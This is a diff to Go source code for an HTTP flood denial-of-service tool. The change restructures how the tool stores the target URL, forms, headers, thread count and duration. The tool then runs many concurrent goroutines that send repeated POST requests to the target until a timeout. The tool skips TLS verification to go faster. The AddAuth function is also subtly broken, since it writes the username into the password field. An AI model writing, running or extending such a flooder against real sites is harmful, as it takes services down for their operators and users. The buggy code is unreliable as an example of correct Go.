@@ -12,27 +12,25 @@ import (
 	"os/signal"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 )
 
 // TargetInf - struct for webaddress and formnames
 type TargetInf struct {
-	webaddress string
-	formnames  url.Values
-	headers    map[string]string
-	basicAuth  []string
-	authSet    bool
-}
-
-var (
-	infoIntern        TargetInf
+	threads           int
+	duration          int
+	webaddress        string
+	formnames         url.Values
+	headers           map[string]string
+	authSet           bool
 	authUser          string
 	authPass          string
 	persistentHeaders http.Header
-)
+}
 
-// AddWebaddress - Add webaddress to TargetInf.webaddress
+// AddWebaddress - Add or Change value for TargetInf.webaddress
 func (inf *TargetInf) AddWebaddress(webAddress string) string {
 	inf.webaddress = webAddress
 	return inf.webaddress
@@ -57,10 +55,29 @@ func (inf *TargetInf) AddHeader(key string, value string) map[string]string {
 }
 
 // AddAuth - Add basic HTTP authentication user and password
-func (inf *TargetInf) AddAuth(user string, password string) []string {
-	inf.basicAuth = append(inf.basicAuth, user, password)
+func (inf *TargetInf) AddAuth(user string, password string) {
+	inf.authPass = user
+	inf.authPass = password
 	inf.authSet = true
-	return inf.basicAuth
+	return
+}
+
+// AppendMore - Append map[string]string key:value pairs to forms or header.
+// makes use of internal functions TargetInf.AddForm and TargetInf.AddHeader
+// mode = FORMS (for forms)
+// mode = HEADERS (for headers)
+func (inf *TargetInf) AppendMore(mode string, input map[string]string, wg *sync.WaitGroup) {
+	for k, v := range input {
+		if mode == "FORMS" {
+			inf.AddForm(k, v)
+		} else if mode == "HEADERS" {
+			inf.AddHeader(k, v)
+		} else {
+			log.Fatalln("ERROR: in func appendToStruct - wrong mode! [FORMS / HEADERS]")
+		}
+	}
+
+	wg.Done()
 }
 
 // MakeForms - initialize the internal Values struct.
@@ -79,11 +96,23 @@ func (inf *TargetInf) MakeHeaders() map[string]string {
 
 // Copy - Copy the TargetInf Struct
 func (inf *TargetInf) Copy() TargetInf {
-	return *inf
+	return *inf // De-reference pointer (return-by-value)
+}
+
+// New - Initialize new DoS
+// d = duration, t = threads, urladdr = webaddress
+func New(d int, t int, urladdr string) *TargetInf {
+	return &TargetInf{
+		formnames:  url.Values{},
+		headers:    make(map[string]string),
+		threads:    t,
+		duration:   d,
+		webaddress: urladdr,
+	}
 }
 
 // makeRequest - handle our complete request workflow. Build Clients and Requests
-func makeRequest(done chan<- struct{}) {
+func makeRequest(done chan<- struct{}, info *TargetInf) {
 	// Set Transport states
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
@@ -96,8 +125,8 @@ func makeRequest(done chan<- struct{}) {
 	}
 
 	result := make(chan *http.Request)
-	go buildRequest(result) // Building our request
-	req := <-result         // Wait for our request
+	go buildRequest(result, info) // Building our request
+	req := <-result               // Wait for our request
 
 	r := runtime.NumGoroutine()
 	resp, err := hc.Do(req)
@@ -105,12 +134,15 @@ func makeRequest(done chan<- struct{}) {
 		log.Printf("ERROR: do post request: %s\n", err)
 	}
 
-	defer resp.Body.Close() // Close response body at end of function
+	// Catch request error e.g. "Connection reset by peer"
+	if resp.Body != nil {
+		defer resp.Body.Close() // Close response body at end of function
+	}
 
 	if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
-		log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, infoIntern.webaddress)
+		log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, info.webaddress)
 	} else {
-		log.Printf("\tRoutine: %6d | Argh! Broken [%d] | %s\n", r, resp.StatusCode, infoIntern.webaddress)
+		log.Printf("\tRoutine: %6d | Argh! Broken [%d] | %s\n", r, resp.StatusCode, info.webaddress)
 	}
 
 	close(result) // Close request result channel
@@ -118,7 +150,7 @@ func makeRequest(done chan<- struct{}) {
 }
 
 // runner - function with context that start makeRequest() and return on ctx.Done()
-func runner(ctx context.Context, start <-chan struct{}) {
+func runner(ctx context.Context, start <-chan struct{}, info *TargetInf) {
 	<-start // Starting routine on close of channel starter
 
 	for {
@@ -127,7 +159,7 @@ func runner(ctx context.Context, start <-chan struct{}) {
 			return // Close runner goroutine
 		default:
 			done := make(chan struct{})
-			go makeRequest(done)
+			go makeRequest(done, info)
 			select {
 			case <-done:
 				continue
@@ -139,19 +171,19 @@ func runner(ctx context.Context, start <-chan struct{}) {
 }
 
 // start - starting N*runner() and building initial request
-func start(ctx context.Context, done chan<- struct{}, threadN int) {
+func start(ctx context.Context, info *TargetInf, done chan<- struct{}) {
 	start := make(chan struct{})
 
-	for i := 1; i < threadN+1; i++ {
+	for i := 1; i < info.threads+1; i++ {
 		log.Printf("INFO: Starting routine: %d\n", i)
-		go runner(ctx, start)
+		go runner(ctx, start, info)
 	}
 
 	// Build initial request
 	func() {
 		log.Println("INFO: Building Initial Request")
 		result := make(chan *http.Request) // create channel result
-		go buildRequest(result)            // Building initial request
+		go buildRequest(result, info)      // Building initial request
 		_ = <-result
 		close(result) // Wait for initial request to be done
 	}()
@@ -161,56 +193,45 @@ func start(ctx context.Context, done chan<- struct{}, threadN int) {
 }
 
 // buildRequest - building request and copy forms and headers in a peristent state
-func buildRequest(result chan<- *http.Request) {
+func buildRequest(result chan<- *http.Request, info *TargetInf) {
 	// Building initial request and add values to request
-	req, err := http.NewRequest("POST", infoIntern.webaddress, strings.NewReader(infoIntern.formnames.Encode()))
+	req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
 	if err != nil {
 		log.Println("ERROR: building request")
 	}
 
-	req.PostForm = infoIntern.formnames // add url.Values too request
+	req.PostForm = info.formnames // add url.Values too request
 
 	// add headers and authorization (if set) to request and make it persistent
-	if persistentHeaders == nil {
-		for key, value := range infoIntern.headers {
+	if info.persistentHeaders == nil {
+		for key, value := range info.headers {
 			req.Header.Set(key, value)
 		}
-		if infoIntern.authSet {
-			req.SetBasicAuth(authUser, authPass)
+		if info.authSet {
+			req.SetBasicAuth(info.authUser, info.authPass)
 			tempVal := req.Header.Values("Authorization")[0]
 			req.Header.Set("Authorization", tempVal)
 		}
-		persistentHeaders = req.Header.Clone()
+		info.persistentHeaders = req.Header.Clone()
 	} else {
-		req.Header = persistentHeaders
+		req.Header = info.persistentHeaders
 	}
 	result <- req
 }
 
-// buildingData - do some initial work
-func buildingData(info *TargetInf) {
-	infoIntern = info.Copy() // Build global struct
-
-	// Set authUser and autPass from struct field-slice basicAuth
-	if infoIntern.authSet {
-		authUser = infoIntern.basicAuth[0]
-		authPass = infoIntern.basicAuth[1]
-	}
-}
-
 // validateThreads - warns if more threads starting as cpu cores available
-func validateThreads(threads int, done chan<- struct{}) {
+func validateThreads(info *TargetInf, done chan<- struct{}) {
 	d := runtime.NumCPU() // runtime.NumCPU() returns the number of available CPU Cores
-	if d < threads {
-		log.Printf("WARNING: more routines: %d than cores: %d\n", threads, d)
+	if d < info.threads {
+		log.Printf("WARNING: more routines: %d than cores: %d\n", info.threads, d)
 		time.Sleep(3 * time.Second)
 	}
 	close(done)
 }
 
 // Dos - start Dos and returns error or nil
-func Dos(threads int, timeInSeconds int, info *TargetInf, done chan<- struct{}) {
-	dostime := time.Duration(timeInSeconds) * time.Second
+func (inf *TargetInf) Dos(wg *sync.WaitGroup) {
+	dostime := time.Duration(inf.duration) * time.Second
 
 	ctx, cancel := context.WithTimeout(context.Background(), dostime) // Intialize context with timeout
 	defer cancel()
@@ -229,15 +250,14 @@ func Dos(threads int, timeInSeconds int, info *TargetInf, done chan<- struct{}) 
 		*/
 	}()
 
-	buildingData(info) // build the datastructure from TargetInf struct and initialize channels
 	sync := make(chan struct{})
-	go validateThreads(threads, sync)
+	go validateThreads(inf, sync)
 	<-sync
 
 	sync = make(chan struct{})
-	go start(ctx, sync, threads) // start routines
-	<-sync                       // wait for start routine
+	go start(ctx, inf, sync) // start routines
+	<-sync                   // wait for start routine
 
 	<-ctx.Done() // wait for context done
-	close(done)  // close dos.Dos()
+	wg.Done()
 }
